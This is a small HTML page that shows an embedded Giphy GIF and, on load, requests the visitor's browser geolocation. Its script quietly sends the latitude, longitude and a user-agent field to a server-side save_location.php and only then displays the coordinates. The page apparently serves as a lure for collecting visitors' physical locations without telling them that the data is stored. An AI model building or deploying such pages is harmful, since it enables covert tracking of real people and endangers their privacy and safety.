<!DOCTYPE html>
<html>
<body onload="getLocation()">
  <iframe src="https://giphy.com/embed/5NPhdqmyRxn8I" width="480" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/oc-logo-google-5NPhdqmyRxn8I">via GIPHY</a></p>

<p id="demo"></p>

<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
    const xhttp = new XMLHttpRequest();
    xhttp.open("GET","save_location.php?lat="+position.coords.latitude + "&long="+ position.coords.longitude + "&user_agent=:");
    xhttp.send();

    
  x.innerHTML = "Latitude: " + position.coords.latitude + 
  "<br>Longitude: " + position.coords.longitude;
}
</script>

</body>
</html>
